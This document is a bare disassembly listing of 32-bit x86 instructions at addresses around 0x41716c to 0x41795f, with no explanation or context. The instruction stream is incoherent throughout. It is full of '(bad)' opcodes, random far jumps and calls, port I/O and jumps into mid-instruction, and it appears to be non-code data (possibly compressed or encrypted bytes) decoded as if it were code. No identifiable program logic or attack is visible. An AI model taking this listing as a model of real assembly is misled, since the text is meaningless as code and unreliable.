  41716c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41716d:	and    eax,0x3b803d4d
  417172:	jl     0x4171c7
  417174:	cli    
  417175:	push   esp
  417176:	stc    
  417177:	idiv   BYTE PTR [edi]
  417179:	jge    0x4171f3
  41717b:	mov    cl,0x9a
  41717d:	jmp    0x4171b5
  41717f:	mov    esp,0x5a6cc724
  417184:	xchg   ebp,eax
  417185:	lods   eax,DWORD PTR ds:[esi]
  417186:	jnp    0x41719f
  417188:	jge    0x41716c
  41718a:	mov    ebx,0xe2ceabff
  41718f:	ret    0x385e
  417192:	fwait
  417193:	cmp    BYTE PTR [ebp+0x63],ah
  417196:	sar    BYTE PTR ds:0xb3976b6b,0x99
  41719d:	add    BYTE PTR [ebp+0x3f],dl
  4171a0:	or     esi,DWORD PTR [edx+0x29]
  4171a3:	int    0x2
  4171a5:	xor    ah,BYTE PTR [eax]
  4171a7:	aad    0x5b
  4171a9:	arpl   si,sp
  4171ab:	jnp    0x4171c0
  4171ad:	leave  
  4171ae:	div    BYTE PTR [edx+esi*1+0x294f7d3e]
  4171b5:	cmp    ebx,ecx
  4171b7:	xchg   edx,eax
  4171b8:	(bad)  
  4171b9:	mov    eax,ds:0xb3068bde
  4171be:	gs (bad) 
  4171c0:	mov    dh,0x3
  4171c2:	add    eax,0x3664a220
  4171c7:	xchg   esi,eax
  4171c8:	xor    bl,ch
  4171ca:	jmp    0x230f128d
  4171cf:	mov    cl,0xe7
  4171d1:	fdiv   QWORD PTR [ebp-0x5a]
  4171d4:	sub    dl,BYTE PTR [esi*2+0x553b83c0]
  4171db:	inc    ebp
  4171dc:	mov    edx,DWORD PTR [esi-0x53bff74f]
  4171e2:	or     BYTE PTR [ebp+edx*1+0x6ba582be],dh
  4171e9:	repnz adc DWORD PTR [ecx-0x7],edi
  4171ed:	jne    0x41721c
  4171ef:	aaa    
  4171f0:	fld    DWORD PTR [eax]
  4171f2:	mov    ch,0xd6
  4171f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171f5:	inc    ecx
  4171f6:	xchg   ebp,eax
  4171f7:	jmp    0x417208
  4171f9:	mov    eax,ds:0xba91d4c7
  4171fe:	push   0xa7e31e5d
  417203:	imul   edx,ecx,0xbb5dfb4c
  417209:	mov    bh,0xc5
  41720b:	and    BYTE PTR [ebp+0x68c4f00],0xe1
  417212:	call   0x8c76:0x33371d2e
  417219:	or     eax,0xa0a9bd23
  41721e:	mov    DWORD PTR [eax-0x2a1ffd60],esi
  417224:	dec    ecx
  417225:	and    ch,cl
  417227:	in     eax,dx
  417228:	ror    edi,0x66
  41722b:	jne    0x41724c
  41722d:	jno    0x417271
  41722f:	jo     0x417277
  417231:	(bad)  
  417232:	pop    edi
  417233:	jl     0x4171c6
  417235:	jl     0x417246
  417237:	sub    esi,edi
  417239:	cmp    eax,DWORD PTR [eax-0x77]
  41723c:	jmp    0xeb5:0xfddcd8c2
  417243:	mov    edx,0x950a3ed4
  417248:	loopne 0x41727d
  41724a:	mov    ebp,0x891ac8c0
  41724f:	jecxz  0x417222
  417251:	pushfw 
  417253:	dec    eax
  417254:	jno    0x417249
  417256:	or     eax,0xe592b351
  41725b:	and    al,0x7c
  41725d:	mov    WORD PTR [ebp-0x2eca5b38],es
  417263:	cld    
  417264:	mov    cl,0x8f
  417266:	lahf   
  417267:	xor    BYTE PTR [edx-0x5cc51e2b],0x7f
  41726e:	xor    BYTE PTR [edx],0xa0
  417271:	or     eax,0x38a6a73e
  417276:	shr    DWORD PTR [esi],1
  417278:	into   
  417279:	pop    ecx
  41727a:	push   esp
  41727b:	pushf  
  41727c:	mov    ebx,0xbec4fe77
  417281:	jne    0x41724d
  417283:	push   ebx
  417284:	in     eax,dx
  417285:	pop    eax
  417286:	es jle 0x4172e2
  417289:	fld    QWORD PTR [esi]
  41728b:	push   esp
  41728c:	add    bh,BYTE PTR [ebp+0x54]
  41728f:	or     eax,0x9d9c371a
  417294:	dec    esp
  417295:	ret    0xdea3
  417298:	loop   0x4172cd
  41729a:	imul   ebx,DWORD PTR [ebx],0xffffffdb
  41729d:	shr    ch,0x70
  4172a0:	pusha  
  4172a1:	pop    es
  4172a2:	fisubr DWORD PTR [edx-0x3767d88]
  4172a8:	or     al,0x71
  4172aa:	add    al,0x4c
  4172ac:	enter  0xe8d8,0x6c
  4172b0:	sbb    bh,BYTE PTR [esi]
  4172b2:	sahf   
  4172b3:	nop
  4172b4:	fdiv   st,st(0)
  4172b6:	in     eax,dx
  4172b7:	pop    es
  4172b8:	repz gs aas 
  4172bb:	inc    eax
  4172bc:	ror    DWORD PTR [ecx-0x5],0x8f
  4172c0:	xchg   DWORD PTR [edi-0x4e833e0d],ebp
  4172c6:	xor    BYTE PTR cs:[edx+0x1f722aeb],0x1b
  4172ce:	std    
  4172cf:	mov    DWORD PTR [ebx+0x235c2fde],ebx
  4172d5:	pop    es
  4172d6:	retf   0x2fae
  4172d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172da:	xchg   edi,eax
  4172db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172dc:	out    0x70,al
  4172de:	cmc    
  4172df:	inc    esi
  4172e0:	jmp    0x4172e0
  4172e2:	sbb    al,0xa0
  4172e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172e5:	inc    esi
  4172e6:	into   
  4172e7:	mov    ebx,0xba2d90a5
  4172ec:	inc    ebx
  4172ed:	push   es
  4172ee:	push   cs
  4172ef:	add    DWORD PTR [edx],edx
  4172f1:	fwait
  4172f2:	mov    esi,0x257d8cf9
  4172f7:	jl     0x417376
  4172f9:	mov    edx,0x52b75e3e
  4172fe:	xchg   ecx,eax
  4172ff:	cwde   
  417300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417301:	dec    esp
  417302:	xor    bl,ah
  417304:	test   DWORD PTR [eax+0x40],ebp
  417307:	xchg   esp,eax
  417308:	ret    0x71cf
  41730b:	push   ecx
  41730c:	add    eax,0xe7fdd08f
  417311:	popa   
  417312:	call   0x2b5fba62
  417317:	pop    ebx
  417318:	mov    WORD PTR [ecx-0x2be5ff28],ds
  41731e:	mov    ds:0xa2e38403,al
  417323:	xlat   BYTE PTR ds:[ebx]
  417324:	into   
  417325:	(bad)  
  417326:	ds into 
  417328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417329:	mov    ah,al
  41732b:	inc    ebp
  41732d:	pop    esp
  41732e:	into   
  41732f:	mov    bl,0xa9
  417331:	ss jecxz 0x41738d
  417334:	and    al,dl
  417336:	(bad)  
  417337:	call   0x12fb13ef
  41733c:	(bad)  
  41733d:	data16 into 
  41733f:	lods   eax,DWORD PTR ds:[esi]
  417340:	out    0x51,eax
  417342:	stc    
  417343:	or     cl,ah
  417345:	das    
  417346:	sub    bl,BYTE PTR [eax+ebp*1+0x87252d3]
  41734d:	ja     0x4173b0
  41734f:	mov    edx,0x47da1f5e
  417354:	pop    edx
  417355:	sub    eax,0x74363459
  41735a:	(bad)  
  41735b:	shr    ah,cl
  41735d:	cmp    dl,ah
  41735f:	imul   edi,DWORD PTR [edx],0x16983d96
  417365:	jle    0x417335
  417367:	sub    DWORD PTR ds:0x2fb7f989,ebp
  41736d:	add    ebp,DWORD PTR [eax-0x5710847e]
  417373:	out    0x5,al
  417375:	and    DWORD PTR [edi],ecx
  417377:	dec    eax
  417378:	or     dl,BYTE PTR [esi-0x507d50b6]
  41737e:	or     esi,ebx
  417380:	nop
  417381:	pop    es
  417382:	and    eax,0x944d3203
  417387:	push   ss
  417388:	aam    0xd5
  41738a:	jmp    0x32ba0899
  41738f:	stos   BYTE PTR es:[edi],al
  417390:	retf   
  417391:	jne    0x41732a
  417393:	std    
  417394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417395:	jecxz  0x417341
  417397:	arpl   WORD PTR [edx+0x29],ax
  41739a:	pop    esi
  41739b:	enter  0xde95,0x24
  41739f:	loope  0x4173ed
  4173a1:	outs   dx,DWORD PTR ds:[esi]
  4173a2:	mov    ds:0x70f8bacf,al
  4173a7:	clc    
  4173a8:	inc    esi
  4173a9:	pop    ds
  4173aa:	xchg   esi,eax
  4173ab:	inc    ebx
  4173ac:	mov    eax,0x195ee673
  4173b1:	out    dx,eax
  4173b2:	mov    esi,0xad274aaf
  4173b7:	std    
  4173b8:	push   0xffffffae
  4173ba:	sub    ebx,DWORD PTR [ebx+0x2a5e9538]
  4173c0:	jmp    0x2cc8:0x678f890a
  4173c7:	jg     0x4173e1
  4173c9:	add    BYTE PTR [eax],bh
  4173cb:	retf   0xd9d9
  4173ce:	stos   BYTE PTR es:[edi],al
  4173cf:	sub    eax,0xc4a1a613
  4173d4:	test   DWORD PTR [edi+edi*4+0x8],ebx
  4173d8:	dec    ecx
  4173d9:	(bad)  
  4173da:	sbb    ebx,DWORD PTR [edi+0x41e13228]
  4173e0:	imul   edi,DWORD PTR [eax],0x7
  4173e3:	jb     0x41738f
  4173e5:	mov    al,0xeb
  4173e7:	push   eax
  4173e8:	loope  0x417423
  4173ea:	inc    edi
  4173eb:	icebp  
  4173ec:	ja     0x417420
  4173ee:	push   0x20
  4173f0:	shl    DWORD PTR [eax+edx*2],1
  4173f3:	xor    al,0x79
  4173f5:	jno    0x417412
  4173f7:	pop    ds
  4173f8:	jecxz  0x417437
  4173fa:	jae    0x4173c5
  4173fc:	pop    es
  4173fd:	in     eax,dx
  4173fe:	push   esp
  4173ff:	test   BYTE PTR [ebp-0x44cd0ca5],ah
  417405:	jb     0x41738a
  417407:	loop   0x417391
  417409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41740a:	xor    BYTE PTR [edi+0x63942b34],ah
  417410:	jne    0x4173a1
  417412:	je     0x4173c6
  417414:	push   edx
  417415:	mov    eax,0xd0c2d0cb
  41741a:	in     al,dx
  41741b:	les    ebx,FWORD PTR [ebx+edx*1+0x75]
  41741f:	fdiv   st(7),st
  417421:	cmp    DWORD PTR [ebp+0x23],ebx
  417424:	fstp   DWORD PTR [ebx]
  417426:	test   DWORD PTR [ecx+ebx*8],ebx
  417429:	pusha  
  41742a:	jmp    FWORD PTR [esi-0x1c]
  41742d:	es jge 0x4173e3
  417430:	and    eax,eax
  417432:	pop    edi
  417433:	inc    ecx
  417434:	xor    DWORD PTR [bx+si],esi
  417437:	ror    ch,0x11
  41743a:	out    dx,al
  41743b:	xchg   ecx,eax
  41743c:	cwde   
  41743d:	cmp    al,0xb3
  41743f:	mov    dh,0x23
  417441:	(bad)  
  417442:	int3   
  417443:	aam    0x97
  417445:	dec    edi
  417446:	and    esi,eax
  417448:	mov    eax,ds:0xb4f89217
  41744d:	mul    BYTE PTR [esi]
  41744f:	ss jp  0x417443
  417452:	icebp  
  417453:	mov    ecx,0x507bd5ef
  417458:	ins    DWORD PTR es:[edi],dx
  417459:	mov    ds:0x75036a63,eax
  41745e:	dec    esi
  41745f:	int    0x7f
  417461:	in     eax,dx
  417462:	cli    
  417463:	pusha  
  417464:	inc    si
  417466:	ror    DWORD PTR [esi-0x15],cl
  417469:	push   ds
  41746a:	pop    ebp
  41746b:	xor    dh,BYTE PTR [ebx-0x5990f033]
  417471:	inc    esi
  417472:	xchg   DWORD PTR [ebp+0x52],ebx
  417475:	mov    eax,0x169df21a
  41747a:	or     al,0x2e
  41747c:	xlat   BYTE PTR ds:[ebx]
  41747d:	lahf   
  41747e:	imul   edx,DWORD PTR [ebp+0x20787d1d],0x53
  417485:	test   edi,esp
  417487:	adc    al,0x4c
  417489:	dec    ebx
  41748a:	lahf   
  41748b:	sbb    esp,edi
  41748d:	mov    BYTE PTR [edx],bl
  41748f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417490:	mov    esi,0x4d8702fd
  417495:	dec    ebp
  417496:	and    eax,0x7793e5d0
  41749b:	shl    DWORD PTR ds:0xb8cce2de,0x7e
  4174a2:	lods   eax,DWORD PTR ds:[esi]
  4174a3:	sbb    ch,BYTE PTR gs:[ebx+0x4b]
  4174a7:	dec    ebx
  4174a8:	cmp    dl,BYTE PTR es:[esi-0x34]
  4174ac:	jge    0x41749c
  4174ae:	jl     0x41746a
  4174b0:	sbb    eax,0x30a87298
  4174b5:	in     al,0x96
  4174b7:	aaa    
  4174b8:	(bad)  
  4174b9:	(bad)  
  4174ba:	rcl    DWORD PTR [ecx+0x476e1173],1
  4174c0:	enter  0x404,0xd7
  4174c4:	jge    0x417538
  4174c6:	test   eax,0x1648631e
  4174cb:	and    dl,BYTE PTR [esi+0x24]
  4174ce:	loopne 0x4174e7
  4174d0:	sbb    al,0x3f
  4174d2:	xchg   ecx,eax
  4174d3:	cdq    
  4174d4:	fwait
  4174d5:	sbb    cl,dl
  4174d7:	and    al,0xa6
  4174d9:	dec    edi
  4174da:	push   ds
  4174db:	fdivr  DWORD PTR [edx+0x4e]
  4174de:	repnz and bl,bl
  4174e1:	int3   
  4174e2:	shl    BYTE PTR [ecx-0x2ca3dd0c],cl
  4174e8:	iret   
  4174e9:	in     al,dx
  4174ea:	fbstp  TBYTE PTR [ebp-0x15199ae0]
  4174f0:	js     0x417557
  4174f2:	sbb    al,BYTE PTR [ebx]
  4174f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f5:	arpl   ax,dx
  4174f7:	jp     0x4174ee
  4174f9:	fisttp QWORD PTR [esi-0x4e6e6d9]
  4174ff:	mov    esp,0xd68bddde
  417504:	imul   esp,DWORD PTR [esi],0x4f148541
  41750a:	stos   DWORD PTR es:[edi],eax
  41750b:	clc    
  41750c:	jge    0x417494
  41750e:	ds popf 
  417510:	jno    0x41758f
  417512:	(bad)  
  417514:	bound  ebx,QWORD PTR [ecx+0x48c1c426]
  41751a:	mov    edi,0x47e03790
  41751f:	push   es
  417520:	ror    DWORD PTR [ecx+ebp*1-0x69],cl
  417524:	push   ebx
  417525:	cmp    eax,DWORD PTR [eax-0x19443f4c]
  41752b:	aaa    
  41752c:	leave  
  41752d:	sbb    esp,DWORD PTR [edx-0x2f]
  417530:	pusha  
  417531:	pop    edi
  417532:	into   
  417533:	in     al,dx
  417534:	lea    esp,[edi-0xd]
  417537:	and    eax,DWORD PTR [esi+0x169b2f5c]
  41753d:	cdq    
  41753e:	jg     0x4174e1
  417540:	push   ebx
  417541:	pop    esp
  417542:	mov    eax,gs:0x9f770d6d
  417548:	sbb    eax,0x88cbb6d2
  41754d:	mov    ds:0xb5e490d1,al
  417552:	(bad)  
  417553:	dec    eax
  417554:	idiv   DWORD PTR [ecx+0x21abd683]
  41755a:	jbe    0x41750a
  41755c:	dec    ecx
  41755d:	jle    0x417512
  41755f:	pop    eax
  417560:	add    ah,BYTE PTR [edx-0x63f4e989]
  417566:	mov    ch,0xb1
  417568:	imul   DWORD PTR [edi+0x3cbccd8d]
  41756e:	cmp    eax,0x1384617c
  417573:	xlat   BYTE PTR ds:[ebx]
  417574:	ficom  DWORD PTR [ecx-0x53766c85]
  41757a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41757b:	inc    esi
  41757c:	mov    bl,0x2
  41757e:	sti    
  41757f:	fs push edx
  417581:	pop    ds
  417582:	add    dl,BYTE PTR [edx-0x16]
  417585:	cdq    
  417586:	call   0x2caa:0xdd118a16
  41758d:	and    ebx,DWORD PTR [edi+eax*2+0x44]
  417591:	enter  0x7ada,0xc1
  417595:	cli    
  417596:	mov    cl,0x2
  417598:	repnz push edi
  41759a:	shl    DWORD PTR [ebx-0x31674440],cl
  4175a0:	dec    ebp
  4175a2:	mov    bh,BYTE PTR [eax+ecx*2+0x2f]
  4175a6:	mov    esp,0x1fb82de
  4175ab:	lods   eax,DWORD PTR ds:[esi]
  4175ac:	sbb    BYTE PTR [ebx+0x10],dh
  4175af:	in     al,dx
  4175b0:	push   ebx
  4175b1:	dec    eax
  4175b2:	das    
  4175b3:	popa   
  4175b4:	cdq    
  4175b5:	pop    edx
  4175b6:	(bad)  
  4175b7:	cwde   
  4175b8:	ror    edx,0xce
  4175bb:	sbb    al,0xd9
  4175bd:	dec    edi
  4175be:	test   DWORD PTR [edx-0x2e],0xd25ecf96
  4175c5:	shr    BYTE PTR [ebx-0x18c6cc9b],1
  4175cb:	xchg   edx,eax
  4175cc:	mov    edi,0xb7e2dc48
  4175d1:	rcr    eax,cl
  4175d3:	std    
  4175d4:	push   0xffffffd0
  4175d6:	pop    esp
  4175d7:	loopne 0x417637
  4175d9:	push   ebp
  4175da:	ja     0x417594
  4175dc:	xchg   esp,eax
  4175dd:	outs   dx,BYTE PTR ds:[esi]
  4175de:	loopne 0x41758d
  4175e0:	push   eax
  4175e1:	repz or BYTE PTR [ebx+esi*8],al
  4175e5:	dec    edi
  4175e6:	in     al,dx
  4175e7:	fisttp DWORD PTR [esi+0x68]
  4175ea:	sti    
  4175eb:	shl    BYTE PTR [eax],1
  4175ed:	jbe    0x4175c5
  4175ef:	sbb    eax,0xf7bf5f2a
  4175f4:	ja     0x417633
  4175f6:	jg     0x417635
  4175f8:	add    DWORD PTR [edx+0x3a90d84],ebx
  4175fe:	mov    eax,0x8b885535
  417603:	mov    DWORD PTR [ebp-0x44],edi
  417606:	xchg   esp,eax
  417607:	sub    DWORD PTR ss:[ebp-0xf],edx
  41760b:	pop    ss
  41760c:	push   ecx
  41760d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41760e:	shld   DWORD PTR [ecx+0xa],eax,cl
  417612:	mov    cl,0xd7
  417614:	lea    ecx,[ebx+0x16]
  417617:	mov    ebp,0xb473bedc
  41761c:	test   DWORD PTR [ecx+0x3],esi
  41761f:	mov    DWORD PTR [esi],ecx
  417621:	sub    dh,BYTE PTR [edi+edi*2+0x23]
  417625:	dec    ecx
  417626:	add    DWORD PTR [edi],edi
  417628:	lea    ebp,[ebp-0x131f8231]
  41762e:	pop    ds
  41762f:	sbb    al,0x61
  417631:	push   ds
  417632:	(bad)  
  417633:	out    0xb9,eax
  417635:	out    dx,al
  417636:	cmc    
  417637:	or     bl,BYTE PTR [edx]
  417639:	into   
  41763a:	sbb    DWORD PTR [eax+0x4a],ecx
  41763d:	popa   
  41763e:	mov    eax,0x30e230d9
  417643:	cmp    cl,BYTE PTR [ecx+0x59dfda14]
  417649:	or     dh,bh
  41764b:	inc    eax
  41764c:	shl    DWORD PTR [eax],0xf9
  41764f:	cmp    edi,edi
  417651:	xchg   ecx,eax
  417652:	inc    cx
  417654:	ds adc edx,eax
  417657:	pop    ss
  417658:	mov    bl,0x49
  41765a:	mov    WORD PTR [ecx+0x32],gs
  41765d:	sub    DWORD PTR [ebx-0x50ec15bc],ebp
  417663:	or     al,dh
  417665:	jecxz  0x4175f1
  417667:	setb   ah
  41766a:	push   esp
  41766b:	sub    ah,ch
  41766d:	xor    BYTE PTR [ebx],0x85
  417670:	or     eax,esp
  417672:	xchg   DWORD PTR [esi+0x11],ecx
  417675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417676:	shr    DWORD PTR [ebx-0x67],0x47
  41767a:	enter  0xb8e,0x5d
  41767e:	or     DWORD PTR [esi-0x73832b56],esp
  417684:	cli    
  417685:	xor    al,0x69
  417687:	mov    al,ds:0xba40fe5c
  41768c:	xchg   esp,eax
  41768d:	push   cs
  41768e:	jp     0x41761c
  417690:	cli    
  417691:	jne    0x4176a3
  417693:	pop    esi
  417694:	jge    0x417650
  417696:	jp     0x417701
  417698:	daa    
  417699:	and    al,0x80
  41769b:	or     BYTE PTR [edi-0x3c055310],cl
  4176a1:	mov    WORD PTR [edi+0x41ad7d5],?
  4176a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176a8:	mov    esp,0x44262e5b
  4176ad:	xchg   esi,eax
  4176ae:	add    bl,BYTE PTR ds:0x3c40b8aa
  4176b4:	pusha  
  4176b5:	dec    esp
  4176b6:	adc    ebx,ebx
  4176b8:	nop
  4176b9:	cmp    al,0xd6
  4176bb:	test   DWORD PTR [ecx+0x29],0x84853b41
  4176c2:	nop
  4176c3:	clc    
  4176c4:	(bad)  
  4176c5:	mov    edi,0x2cba0ded
  4176ca:	mov    ah,0x29
  4176cc:	js     0x4176ba
  4176ce:	and    eax,0x24fb7c3c
  4176d3:	in     eax,dx
  4176d4:	xchg   esi,eax
  4176d5:	pop    ss
  4176d6:	push   edi
  4176d7:	pop    eax
  4176d8:	mov    eax,0x2ce642fa
  4176dd:	jecxz  0x417754
  4176df:	ret    0xa924
  4176e2:	lods   eax,DWORD PTR ds:[esi]
  4176e3:	jno    0x4176ae
  4176e5:	imul   BYTE PTR [ecx+0x2c]
  4176e8:	jmp    0x299e:0x59e8dbb0
  4176ef:	sbb    al,0xf
  4176f1:	xchg   edi,eax
  4176f2:	mov    DWORD PTR [edi+0x3b],ecx
  4176f5:	gs dec ebx
  4176f7:	push   ebp
  4176f8:	ins    BYTE PTR es:[edi],dx
  4176f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176fa:	mov    bh,0xb0
  4176fc:	xchg   esi,eax
  4176fd:	mov    al,ds:0x19a481bf
  417702:	jmp    0x5b68:0x3b6899e6
  417709:	not    BYTE PTR [edx+esi*4]
  41770c:	xlat   BYTE PTR es:[ebx]
  41770e:	pusha  
  41770f:	mov    esp,0xe5d24b08
  417714:	(bad)  
  417715:	into   
  417716:	test   eax,0xbfc0de7f
  41771b:	add    BYTE PTR [ebx],0x18
  41771e:	imul   ch
  417720:	mov    eax,0x68b5d9b9
  417725:	inc    eax
  417727:	aam    0xe9
  417729:	je     0x417769
  41772b:	sbb    dl,dl
  41772d:	or     DWORD PTR [eax],ecx
  41772f:	clc    
  417730:	fldenv [edi]
  417732:	imul   BYTE PTR [ecx+esi*4+0x5830786d]
  417739:	pop    ebx
  41773a:	lahf   
  41773b:	jp     0x4176fe
  41773d:	mov    bl,dl
  41773f:	jno    0x417736
  417741:	cmp    ebx,0x7c
  417744:	adc    dl,ch
  417746:	call   0x10ba:0xf3dfc2bf
  41774d:	lea    edx,[eax-0x59]
  417750:	or     DWORD PTR [ebp+0x4c],ebx
  417753:	inc    ecx
  417754:	and    BYTE PTR [ecx],ch
  417756:	and    BYTE PTR [edi],bl
  417758:	mov    ah,0xd
  41775a:	or     eax,0x4f2e4233
  41775f:	stc    
  417760:	inc    eax
  417761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417762:	mov    DWORD PTR [ebp-0x41],esi
  417765:	(bad)  
  417766:	push   edx
  417767:	or     DWORD PTR [ebx-0x34],0xb
  41776b:	jmp    0xefa8b5ab
  417770:	inc    ebp
  417771:	mov    al,0x11
  417773:	push   ecx
  417774:	inc    esi
  417775:	in     al,dx
  417776:	sbb    DWORD PTR [edx-0x48],ecx
  417779:	fdiv   DWORD PTR [ebx]
  41777b:	and    ah,ch
  41777d:	cs call 0xc68b000f
  417783:	inc    eax
  417784:	jmp    0x9771:0x46269c3e
  41778b:	fadd   QWORD PTR [ebp+0x60]
  41778e:	out    dx,eax
  41778f:	jno    0x4177c6
  417791:	retf   
  417792:	inc    esp
  417793:	cmp    DWORD PTR [ecx],ecx
  417795:	push   edi
  417796:	mov    cl,0xe0
  417798:	adc    al,0x5
  41779a:	pop    ds
  41779b:	jb     0x4177a4
  41779d:	iret   
  41779e:	(bad)  
  41779f:	dec    edx
  4177a0:	icebp  
  4177a1:	je     0x41775f
  4177a3:	aas    
  4177a4:	les    esi,FWORD PTR [edx-0x7dddb97]
  4177aa:	das    
  4177ab:	sti    
  4177ac:	jno    0x4177ba
  4177ae:	rol    DWORD PTR [edi],0x26
  4177b1:	stos   BYTE PTR es:[edi],al
  4177b2:	clc    
  4177b3:	dec    ebx
  4177b4:	xor    DWORD PTR [edx-0x5b],esp
  4177b7:	dec    ecx
  4177b8:	in     eax,dx
  4177b9:	popa   
  4177ba:	pop    esi
  4177bb:	jmp    0x956d:0x1b31b5a4
  4177c2:	sbb    edi,ebp
  4177c4:	aaa    
  4177c5:	inc    edi
  4177c6:	pop    ecx
  4177c7:	cs xor al,0x19
  4177ca:	loope  0x4177dc
  4177cc:	out    dx,eax
  4177cd:	retf   0x2b8c
  4177d0:	push   ebx
  4177d1:	sub    bl,BYTE PTR [eax]
  4177d3:	das    
  4177d4:	sbb    DWORD PTR [edx],ebx
  4177d6:	cli    
  4177d7:	mov    DWORD PTR [edi+0x2a],eax
  4177da:	mov    ds:0x1319c011,al
  4177df:	jnp    0x417837
  4177e1:	ret    
  4177e2:	sub    bl,dl
  4177e4:	inc    edx
  4177e5:	dec    ebp
  4177e6:	jmp    0x2f41:0x9e936d92
  4177ed:	jns    0x417826
  4177ef:	in     eax,0xb8
  4177f1:	sbb    ch,ah
  4177f3:	stos   DWORD PTR es:[edi],eax
  4177f4:	into   
  4177f5:	dec    edi
  4177f6:	stos   DWORD PTR es:[edi],eax
  4177f7:	jb     0x41779d
  4177f9:	leave  
  4177fa:	aas    
  4177fb:	push   0x5e
  4177fd:	cmp    ebp,DWORD PTR [ebx-0x715fd925]
  417803:	or     eax,0x6e358829
  417808:	xchg   edx,eax
  417809:	adc    bh,BYTE PTR fs:[eax-0x19]
  41780d:	popf   
  41780e:	outs   dx,DWORD PTR ds:[si]
  417810:	loopne 0x4177b6
  417812:	mov    esi,0xe28c0b9e
  417817:	push   ds
  417818:	mov    ebp,0x5a5a3773
  41781d:	adc    al,0x6f
  41781f:	mov    cl,0xf3
  417821:	imul   eax,DWORD PTR [edi],0x8dfb1a58
  417827:	cmp    cl,BYTE PTR [ecx+0x3821cc5b]
  41782d:	and    eax,0x9617cc4
  417832:	(bad)  
  417833:	mov    ds:0x49f6e077,eax
  417838:	push   0xfffffff9
  41783a:	clc    
  41783b:	jns    0x417847
  41783d:	adc    ah,BYTE PTR [eax+0x22]
  417840:	mov    al,ds:0xf96db61d
  417845:	sahf   
  417846:	enter  0x6a19,0x26
  41784a:	cs mov ebp,0x85b8339e
  417850:	ret    
  417851:	pop    edx
  417852:	sub    al,BYTE PTR [esi+0x700c110f]
  417858:	clc    
  417859:	pavgb  mm2,mm4
  41785c:	dec    edx
  41785d:	xchg   ebp,eax
  41785e:	lods   al,BYTE PTR ds:[esi]
  41785f:	cmp    eax,0x58e2a047
  417864:	xchg   esp,eax
  417865:	cmp    al,0xca
  417867:	stos   DWORD PTR es:[edi],eax
  417868:	pop    ss
  417869:	sub    eax,0xaf425cc
  41786e:	and    eax,0x92894a17
  417873:	mov    al,ds:0xc38a7022
  417878:	push   cs
  417879:	imul   esp,ebp,0xfffffffe
  41787c:	add    ch,BYTE PTR [edx-0x56]
  41787f:	pop    edx
  417880:	(bad)  
  417881:	lahf   
  417882:	daa    
  417883:	das    
  417884:	pushf  
  417885:	xor    eax,0x60ae6f
  41788a:	jne    0x41786d
  41788c:	mov    al,0x4
  41788e:	scas   al,BYTE PTR es:[edi]
  41788f:	iret   
  417890:	call   0xec7:0xae43b52c
  417897:	jge    0x4178bf
  417899:	sub    esi,DWORD PTR [esi+0x7a]
  41789c:	not    BYTE PTR [ebx]
  41789e:	cdq    
  41789f:	mov    al,0xf2
  4178a1:	cs cs scas eax,DWORD PTR es:[edi]
  4178a4:	inc    ecx
  4178a5:	fisttp QWORD PTR [ebx+0x684c1e80]
  4178ab:	jbe    0x41786b
  4178ad:	cmp    al,0x5c
  4178af:	jmp    0x8390758a
  4178b4:	sub    eax,0x4029dc22
  4178b9:	shr    eax,cl
  4178bb:	pop    edx
  4178bc:	cmp    cl,bh
  4178be:	mov    ds:0x3930c753,eax
  4178c3:	pop    ss
  4178c4:	xchg   dh,ah
  4178c6:	dec    ebx
  4178c7:	or     dh,BYTE PTR [eax-0x1bfb4aa8]
  4178cd:	mov    al,ds:0x9b68cfba
  4178d2:	clc    
  4178d3:	or     ebp,DWORD PTR [ecx]
  4178d5:	jl     0x4178c1
  4178d7:	out    dx,eax
  4178d8:	mov    bl,0xc8
  4178da:	es loope 0x417934
  4178dd:	(bad)  
  4178de:	shr    BYTE PTR [eax-0x789c229],1
  4178e4:	out    0x1d,eax
  4178e6:	push   esp
  4178e7:	mov    ah,0x99
  4178e9:	test   ecx,esi
  4178eb:	and    edi,DWORD PTR [edi+eiz*4+0x5d]
  4178ef:	pop    esi
  4178f0:	es ss (bad) 
  4178f4:	ja     0x4178fd
  4178f6:	jl     0x417910
  4178f8:	mov    al,BYTE PTR [ebx-0x1b48c3d3]
  4178fe:	sbb    BYTE PTR [edi+eiz*8],0xbc
  417902:	xchg   edi,eax
  417903:	fsub   st(2),st
  417905:	mov    al,ds:0x6df6ad1
  41790a:	or     dl,BYTE PTR [eax-0x2daa925e]
  417910:	loop   0x417939
  417912:	loop   0x41793e
  417914:	inc    ah
  417916:	pop    ebp
  417917:	das    
  417918:	xor    al,0x16
  41791a:	(bad)  
  41791b:	repz ja 0x4178b6
  41791e:	cmp    eax,0x7666c7d2
  417923:	fild   WORD PTR [ecx-0x1c]
  417926:	mov    ds:0x350d334b,al
  41792b:	or     edx,ebx
  41792d:	mov    al,0x42
  41792f:	jmp    0xbb0e4c42
  417934:	aas    
  417935:	lock push edi
  417937:	loope  0x4178cf
  417939:	cmp    al,0x67
  41793b:	(bad)  
  41793d:	mov    WORD PTR [esi*8+0x700d886b],ds
  417944:	aad    0x23
  417946:	fwait
  417947:	cmp    al,0xe3
  417949:	add    eax,0xe271ec8e
  41794e:	bound  edi,QWORD PTR [ebp+0x16f79fba]
  417954:	out    dx,al
  417955:	push   ds
  417956:	cmc    
  417957:	mov    ebx,0x669da4ec
  41795c:	pop    ds
  41795d:	scas   al,BYTE PTR es:[edi]
  41795e:	int3   
  41795f:	sub    BYTE PTR [ebx*8-0x36b63190],ah
